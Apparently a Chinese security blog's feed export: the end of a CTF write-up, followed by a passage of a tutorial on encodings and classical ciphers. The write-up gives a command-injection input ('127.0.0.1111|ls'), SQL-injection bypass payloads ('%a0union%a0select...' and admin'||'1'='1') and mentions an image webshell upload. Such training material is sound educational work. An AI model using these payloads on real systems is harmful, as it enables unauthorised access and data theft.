<h3><span id="你能进来么">你能进来么</span></h3><h4><span id="题目">题目</span></h4><p>你能进来么<br>描述：图片上传功能真的好强大<br><a href="http://218.76.35.75:20103" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>上传一个图片马直接拿到flag</p>
<h4><span id="flag">Flag</span></h4><p>flag{uploadwithinclude}</p>
<h3><span id="好简单的题目">好简单的题目</span></h3><h4><span id="题目">题目</span></h4><p>好简单的题目<br>描述：我要dir溢出你，信不信<br><a href="http://218.76.35.75:20105" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>这个题目，原本就是一个不可能的命题，谁都不可能dir命令能溢出服务器，猜测出题者考察命令执行，并且，页面上也为目标Ip的输入，我们输入127.0.0.1 返回Ping的结果</p>
<p>猜测，目标IP后面可以加上连接符，执行多条语句。</p>
<p>这里有个小小的障碍，linux下的连接符有多个。如&amp;&amp;,||,;,| 我们需要都测试后面命令为简单的ls 即可</p>
<p>127.0.0.1111|ls</p>
<p>可以看到有md5字符串返回。猜测为文件夹。<br><a href="http://218.76.35.75:20105/3f83e03a1e4e65573ef11cca25048808/" target="_blank" rel="noopener">http://218.76.35.75:20105/3f83e03a1e4e65573ef11cca25048808/</a><br>访问即可获得flag</p>
<h4><span id="flag">Flag</span></h4><p>flag{dirpwnitdoyouknow}</p>
<h3><span id="没那么简单">没那么简单</span></h3><h4><span id="题目">题目</span></h4><p>没那么简单<br>（50位解决者）<br>描述：我认为这是一个sql注入，你发现了吗<br><a href="http://218.76.35.75:20108" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>发现存在robots.txt 文件</p>
<p>访问该地址。得到upload.zip</p>
<p>Upload.zip为index.php</p>
<p>查看Index.php后。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8727.png" alt=""></p>
<p>发现对大多数的字符进行了过滤。该过滤方式为黑名单判断，我们只需要找到程序中，为过滤完全的字符，进行payload编写即可。</p>
<p>查找wooyun或者其他地方的资料库，可以知道.%0a 同样可以用来做空格的代替。</p>
<p>那么我们只需要构造如下参数提交</p>
<p>username=admind’%a0union%a0select%a0’4124bc0a9335c27f086f24ba207a4912’%a0from%a0admin%a0where%a0’1’=’1&amp;password=aa<br>即可得到flag</p>
<h4><span id="flag">Flag</span></h4><p>flag{robotsfilehassomehappything}</p>
<h3><span id="有趣的注入">有趣的注入</span></h3><h4><span id="题目">题目</span></h4><p>有趣的注入<br>描述：在渗透测试中，任何细节都不能错过。sql注入是渗透测试中最常使用的攻击技术。这里有一个简单的网站，请帮忙找到flag。<br><a href="http://218.76.35.75:20116" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>1.文件包含（需要开一下脑洞，猜一猜文件名）</p>
<p>根据提示，可以得到一个目录：</p>
<p><a href="http://218.76.35.75:20116/flagishere/" target="_blank" rel="noopener">http://218.76.35.75:20116/flagishere/</a><br>2.访问这个目录，是一个登录界面，这道题目考的是注入，只不过考点是sql注入的绕过。后端代码中检测了并且拦截了各种sql的关键字。</p>
<p>但是，可以使用“||”来代替关键词 OR</p>
<p>用户名和密码输入admin’||’1’=’1即可绕过检测登录，获得flag</p>
<h4><span id="flag">Flag</span></h4><p>flag{s0_e4sy<em>sq1i</em>:)}</p>
<h2><span id="0x03-总结">0x03 总结</span></h2><p>这次CTF的Writeup，有的解题思路是题目给出的，一部分是自己的想法。自己的水平还是有些不够吧！这里只写了一些题目的Writeup，有的题目的链接已经失效了。<br>有的题目是真的不知道做，思路也看不大懂。就这样吧，后面如果可以的话，再更新吧！</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF中那些脑洞大开的编码和加密]]></title>
      <url>https://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="ctf中那些脑洞大开的编码和加密">CTF中那些脑洞大开的编码和加密</span></h1><h2><span id="0x00-前言">0x00 前言</span></h2><p>正文开始之前先闲扯几句吧，玩CTF的小伙伴也许会遇到类似这样的问题:表哥，你知道这是什么加密吗？其实CTF中脑洞密码题(非现代加密方式)一般都是各种古典密码的变形，一般出题者会对密文进行一些处理，但是会给留一些线索，所以写此文的目的是想给小伙伴做题时给一些参考，当然常在CTF里出现的编码也可以了解一下。本来是想尽快写出参考的文章，无奈期间被各种事情耽搁导致文章断断续续写了2个月，文章肯定有许多没有提及到，欢迎小伙伴补充，总之，希望对小伙伴们有帮助吧！</p>
<h2><span id="0x01-目录">0x01 目录</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">常见编码:</span><br><span class="line">    1.ASCII编码</span><br><span class="line">    2.Base64/32/16编码</span><br><span class="line">    3.shellcode编码</span><br><span class="line">    4.Quoted-printable编码</span><br><span class="line">    5.XXencode编码</span><br><span class="line">    6.UUencode编码</span><br><span class="line">    7.URL编码</span><br><span class="line">    8.Unicode编码</span><br><span class="line">    9.Escape/Unescape编码</span><br><span class="line">    10.HTML实体编码</span><br><span class="line">    11.敲击码(Tap code)</span><br><span class="line">    12.莫尔斯电码(Morse Code)</span><br><span class="line">    13.编码的故事</span><br><span class="line"> </span><br><span class="line">各种文本加密</span><br><span class="line"> </span><br><span class="line">换位加密:</span><br><span class="line">    1.栅栏密码(Rail-fence Cipher)</span><br><span class="line">    2.曲路密码(Curve Cipher)</span><br><span class="line">    3.列移位密码(Columnar Transposition Cipher)</span><br><span class="line">     </span><br><span class="line">替换加密:</span><br><span class="line">    1.埃特巴什码(Atbash Cipher)</span><br><span class="line">    2.凯撒密码(Caesar Cipher)</span><br><span class="line">    3.ROT5/13/18/47</span><br><span class="line">    4.简单换位密码(Simple Substitution Cipher)</span><br><span class="line">    5.希尔密码(Hill Cipher)</span><br><span class="line">    6.猪圈密码(Pigpen Cipher)</span><br><span class="line">    7.波利比奥斯方阵密码（Polybius Square Cipher)</span><br><span class="line">    8.夏多密码(曲折加密)</span><br><span class="line">    9.普莱菲尔密码(Playfair Cipher)</span><br><span class="line">    10.维吉尼亚密码(Vigenère Cipher)</span><br><span class="line">    11.自动密钥密码(Autokey Cipher)</span><br><span class="line">    12.博福特密码(Beaufort Cipher)</span><br><span class="line">    13.滚动密钥密码(Running Key Cipher)</span><br><span class="line">    14.Porta密码(Porta Cipher)</span><br><span class="line">    15.同音替换密码(Homophonic Substitution Cipher)</span><br><span class="line">    16.仿射密码(Affine Cipher)</span><br><span class="line">    17.培根密码(Baconian Cipher)</span><br><span class="line">    18.ADFGX和ADFGVX密码(ADFG/VX Cipher)</span><br><span class="line">    19.双密码(Bifid Cipher)</span><br><span class="line">    20.三分密码(Trifid Cipher)</span><br><span class="line">    21.四方密码(Four-Square Cipher)</span><br><span class="line">    22.棋盘密码（Checkerboard Cipher)</span><br><span class="line">    23.跨棋盘密码(Straddle Checkerboard Cipher)</span><br><span class="line">    24.分组摩尔斯替换密码(Fractionated Morse Cipher)</span><br><span class="line">    25.Bazeries密码(Bazeries Cipher)</span><br><span class="line">    26.Digrafid密码(Digrafid Cipher)</span><br><span class="line">    27.格朗普雷密码(Grandpré Cipher)</span><br><span class="line">    28.比尔密码(Beale ciphers)</span><br><span class="line">    29.键盘密码(Keyboard Cipher)</span><br><span class="line"> </span><br><span class="line">其他有趣的机械密码:</span><br><span class="line">    1.恩尼格玛密码</span><br><span class="line"> </span><br><span class="line">代码混淆加密:</span><br><span class="line">    1.asp混淆加密</span><br><span class="line">    2.php混淆加密</span><br><span class="line">    3.css/js混淆加密</span><br><span class="line">    4.VBScript.Encode混淆加密</span><br><span class="line">    5.ppencode</span><br><span class="line">    6.rrencode</span><br><span class="line">    7.jjencode/aaencode</span><br><span class="line">    8.JSfuck</span><br><span class="line">    9.jother</span><br><span class="line">    10.brainfuck编程语言</span><br><span class="line"> </span><br><span class="line">相关工具</span><br><span class="line"> </span><br><span class="line">参考网站</span><br></pre></td></tr></table></figure>
<h2><span id="0x02-正文">0x02 正文</span></h2><h3><span id="常见编码">常见编码</span></h3><h4><span id="1ascii编码">1.ASCII编码</span></h4><p>ASCII编码大致可以分作三部分组成：</p>
<p>第一部分是：ASCII非打印控制字符（参详ASCII码表中0-31）;</p>
<p>第二部分是：ASCII打印字符，也就是CTF中常用到的转换;</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3796563179.jpg" alt="ASCII.jpg"></p>
<p>第三部分是：扩展ASCII打印字符(第一第三部分详见<a href="http://www.asciima.com/" target="_blank" rel="noopener">ASCII码表</a>解释)。</p>
<p>编码转换示例</p>
<p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3369091416.png" alt="小葵.png"></p>
<p>ASCII编码对应十进制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103</span><br></pre></td></tr></table></figure>
<p>对应可以转换成二进制，八进制，十六进制等。</p>
<hr>
<h4><span id="2base643216编码">2.Base64/32/16编码</span></h4><p>base64、base32、base16可以分别编码转化8位字节为6位、5位、4位。16,32,64分别表示用多少个字符来编码，这里我注重介绍base64。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via MIME,在XML中存储复杂数据。</p>
<p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2533169055.png" alt="base64字母表.png"></p>
<p>举个例子(base64)：</p>
<blockquote>
<p>源文本：T   h   e</p>
<p>对应ascii码:84 104 101</p>
<p>8位binary：01010100 01101000 01100101</p>
<p>6位binary：010101 000110 100001 100101</p>
<p>高位补0：000010101 00000110 00100001 00100101</p>
<p>对应ascii码：21   6   33   37</p>
<p>查表：V  G  h  l</p>
</blockquote>
<p>利用Python base64模块，我们分别可以这样加密解密base64 32 16：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1167712558.png" alt="python加解base64.png"></p>
<hr>
<h4><span id="3shellcode编码">3.shellcode编码</span></h4><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>编码后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67</span><br></pre></td></tr></table></figure>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3876383071.png" alt="shellcode.png"></p>
<hr>
<h4><span id="4quoted-printable-编码">4.Quoted-printable 编码</span></h4><p>它是多用途互联网邮件扩展（MIME) 一种实现方式。有时候我们可以邮件头里面能够看到这样的编码，编码原理<a href="http://blog.chacuo.net/494.html" target="_blank" rel="noopener">参考</a>。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/27890106.png" alt="Quoted-printable 编码.png"></p>
<p>源文本：<code>敏捷的棕色狐狸跳过了懒惰的狗</code></p>
<p>编码后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=E6=95=8F=E6=8D=B7=E7=9A=84=E6=A3=95=E8=89=B2=E7=8B=90=E7=8B=B8=E8=B7=B3=E8</span><br><span class="line">=BF=87=E4=BA=86=E6=87=92=E6=83=B0=E7=9A=84=E7=8B=97</span><br></pre></td></tr></table></figure>
<p>编码解码<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="noopener">链接</a></p>
<hr>
<h4><span id="5xxencode编码">5.XXencode编码</span></h4><p>XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。它所选择的可打印字符是：+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz，一共64个字符。跟base64打印字符相比，就是UUencode多一个“-” 字符，少一个”/” 字符。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3058863885.png" alt="XXencode.png"></p>
<p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>编码后：<code>hJ4VZ653pOKBf647mPrRi64NjS0-eRKpkQm-jRaJm65FcNG-gMLdt64FjNkc+</code></p>
<p>编码解码<a href="http://web.chacuo.net/charsetxxencode" target="_blank" rel="noopener">链接</a></p>
<hr>
<h4><span id="6uuencode编码">6.UUencode编码</span></h4><p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p>
<p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>编码后：<code>M5&amp;amp;AE(&#39;%U:6-K(&amp;amp;)R;W=N(&amp;amp;9O&amp;gt;&quot;!J=6UP&amp;lt;R!O=F5R(&#39;1H92!L87IY(&amp;amp;1O9PH*</code></p>
<p>编码解码<a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">链接</a></p>
<hr>
<h4><span id="7url编码">7.URL编码</span></h4><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p>
<p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>编码后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67</span><br></pre></td></tr></table></figure>
<p>编码解码<a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="noopener">链接</a></p>
<hr>
<h4><span id="8unicode编码">8.Unicode编码</span></h4><p>Unicode编码有以下四种编码方式：</p>
<p>源文本：<code>The</code></p>
<p>&amp;#x [Hex]：<code>&amp;amp;#x0054;&amp;amp;#x0068;&amp;amp;#x0065;</code></p>
<p>&amp;# [Decimal]：<code>&amp;amp;#00084;&amp;amp;#00104;&amp;amp;#00101;</code></p>
<p>\U [Hex]：<code>\U0054\U0068\U0065</code></p>
<p>\U+ [Hex]：<code>\U+0054\U+0068\U+0065</code></p>
<p>编码解码<a href="http://www.mxcz.net/tools/Unicode.aspx" target="_blank" rel="noopener">链接</a></p>
<hr>
<h4><span id="9escapeunescape编码">9.Escape/Unescape编码</span></h4><p>Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p>
<p>源文本：<code>The</code></p>
<p>编码后：<code>%u0054%u0068%u0065</code></p>
<hr>
<h4><span id="10html实体编码">10.HTML实体编码</span></h4><p><img src="https://www.hackfun.org/usr/uploads/2016/07/299609014.png" alt="html实体编码.png"></p>
<p>完整编码手册<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">参考</a></p>
<hr>
<h4><span id="11敲击码">11.敲击码</span></h4><p>敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。</p>
<p>敲击码表:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  1  2  3  4  5</span><br><span class="line">1 A  B C/K D  E</span><br><span class="line">2 F  G  H  I  J </span><br><span class="line">3 L  M  N  O  P</span><br><span class="line">4 Q  R  S  T  U</span><br><span class="line">5 V  W  X  Y  Z</span><br></pre></td></tr></table></figure>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1657370061.jpg" alt="敲击码.jpg"></p>
<hr>
<h4><span id="12莫尔斯电码">12.莫尔斯电码</span></h4><p>摩尔斯电码(Morse Code)是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：</p>
<ol>
<li>点（.）</li>
<li>划（-）</li>
<li>每个字符间短的停顿（通常用空格表示停顿）</li>
<li>每个词之间中等的停顿（通常用<code>/</code>划分）</li>
<li>以及句子之间长的停顿</li>
</ol>
<p>摩尔斯电码字母和数字对应表：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE%E6%9C%AA%E5%91%BD%E5%90%8D.png" alt=""></p>
<p>源文本:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>编码后:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- .... . / --.- ..- .. -.-. -.- / -... .-. --- .-- -. / ..-. --- -..- / .--- ..- -- .--. ... / --- ...- . .-. / - .... . / .-.. .- --.. -.-- / -.. --- --.</span><br></pre></td></tr></table></figure>
<p>在线编码解码<a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">传送门</a></p>
<p>摩尔斯电码除了能对字母数字编码以外还对一些标点符号，非英语字符进行了编码，而且还有一些特定意义的组合称为特殊符号，比如<code>·-·-·-·-·-</code>表达的意思是调用信号，表示“我有消息发送”。如果你感兴趣可以参考<a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81" target="_blank" rel="noopener">WiKi</a>。</p>
<hr>
<h4><span id="13编码的故事">13.编码的故事</span></h4><p>推荐大家去看<a href="http://wenku.baidu.com/link?url=kTrscV5j5AsZq5zvBpr2jdkEJW8LqgrkkKsddwWA3YlXmgeqh_be95nMxqbFPOYoVBVy3A6lutlcXVDYLdZ-3iRawJpc0VZ71as07FnxtGS" target="_blank" rel="noopener">编码的故事</a>一文。</p>
<hr>
<h3><span id="各种文本加密">各种文本加密</span></h3><p>文本加密可以将正常文本内容打乱为不可连读的文字或符号(汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)，换行等格式信息也会被清除，达到加密的作用。在进行文本加密时可以设定一个密码，这样只有知道密码的人才能解密文本。密码可以是数字、字母和下划线，最多九位。</p>
<p>加密示例：</p>
<p>源文本：<code>敏捷的棕色狐狸跳过了懒惰的狗</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/997899652.png" alt="文本加密.png"></p>
<p>编码解码<a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">链接</a></p>
<hr>
<h3><span id="换位加密">换位加密</span></h3><h4><span id="1栅栏密码">1.栅栏密码</span></h4><p><strong>（1）介绍</strong></p>
<p>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文，这里以2栏栅栏加密为例。</p>
<p>明文：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>去空格：<code>Thequickbrownfoxjumpsoverthelazydog</code></p>
<p>分组：<code>Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g</code></p>
<p>第一组：<code>Teucbonojmsvrhlzdg</code></p>
<p>第二组：<code>hqikrwfxupoeteayo</code></p>
<p>密文：<code>Teucbonojmsvrhlzdghqikrwfxupoeteayo</code></p>
<p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="2曲路密码">2.曲路密码</span></h4><p>曲路密码(Curve Cipher)是一种换位密码，需要事先双方约定密钥(也就是曲路路径)。</p>
<p>明文：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>填入5行7列表(事先约定填充的行列数)</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2848330636.png" alt="曲路密码表.png"></p>
<p>加密的回路线(事先约定填充的行列数)</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/851589488.png" alt="曲路密码路径.png"></p>
<p>密文：<code>gesfc inpho dtmwu qoury zejre hbxva lookT</code></p>
<hr>
<h4><span id="3列移位密码">3.列移位密码</span></h4><p><strong>（1）介绍</strong></p>
<p>列移位密码(Columnar Transposition Cipher)是一种比较简单，易于实现的换位密码，通过一个简单的规则将明文打乱混合成密文。下面我们以明文 The quick brown fox jumps over the lazy dog，密钥 how are u为例：</p>
<p>填入5行7列表(事先约定填充的行列数，如果明文不能填充完表格可以约定使用某个字母进行填充)</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/917477580.png" alt="列移位密码.png"></p>
<p>密钥：<code>how are u</code></p>
<p>按how are u在字母表中的出现的先后顺序进行编号，我们就有a为1,e为2，h为3，o为4，r为5，u为6，w为7，所以先写出a列，其次e列，以此类推写出的结果便是密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2703606324.png" alt="列移位密码示例.png"></p>
<p>密文：<code>qoury inpho Tkool hbxva uwmtd cfseg erjez</code></p>
<p>这里提供一个行列数相等的填充规则列移位密码加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/" target="_blank" rel="noopener">链接</a></p>
<p>另外由列移位密码变化来的密码也有其他的，比如<a href="http://www.thonky.com/kryptos/amsco-cipher" target="_blank" rel="noopener">Amsco密码</a>(Amsco Cipher)和<a href="http://www.thonky.com/kryptos/cadenus-cipher" target="_blank" rel="noopener">Cadenus密码</a>(Cadenus Cipher)。</p>
<h3><span id="替换加密">替换加密</span></h3><hr>
<h4><span id="1埃特巴什码">1.埃特巴什码</span></h4><p><strong>（1）介绍</strong></p>
<p>埃特巴什码(Atbash Cipher)是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">ZYXWVUTSRQPONMLKJIHGFEDCBA</span><br></pre></td></tr></table></figure>
<p>明文：<code>the quick brown fox jumps over the lazy dog</code></p>
<p>密文：<code>gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</code></p>
<p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="2凯撒密码">2.凯撒密码</span></h4><p><strong>（1）介绍</strong></p>
<p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多<a href="https://en.wikipedia.org/wiki/Caesar_cipher" target="_blank" rel="noopener">参考</a>。</p>
<p>加密实例：</p>
<p>明文：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>偏移量：1</p>
<p>密文：<code>Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/193858221.png" alt="凯撒密码.png"></p>
<p>你也可以使用Python的pycipher模块来加解密，如果提示没有这个模块可以通过<code>pip install pycipher</code>或者其他方式来安装pycipher模块。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pycipher import Caesar</span><br><span class="line">&gt;&gt;&gt; Caesar(key=1).encipher(&apos;The quick brown fox jumps over the lazy dog&apos;)</span><br><span class="line">&apos;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&apos;</span><br><span class="line">&gt;&gt;&gt; Caesar(key=1).decipher(&apos;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</span><br></pre></td></tr></table></figure>
<p>参考表(这里是向后移位加密，向前移位解密)：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3176497054.jpg" alt="凯撒密码移位规律表.jpg"></p>
<p>加密解密<a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">链接</a>(这个网站可以将26种情况一次性列举出来，比较方便)</p>
<hr>
<h4><span id="3rot5131847">3.ROT5/13/18/47</span></h4><p><strong>（1）介绍</strong></p>
<p>ROT5/13/18/47是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取。</p>
<blockquote>
<p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p>
<p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</p>
<p>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。</p>
<p>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p>
<p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码，下面以rot13以例。</p>
</blockquote>
<p>明文：<code>the quick brown fox jumps over the lazy dog</code></p>
<p>密文：<code>gur dhvpx oebja sbk whzcf bire gur ynml qbt</code></p>
<p><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="4简单替换密码">4.简单替换密码</span></h4><p><strong>（1）介绍</strong></p>
<p>简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的。 比如：</p>
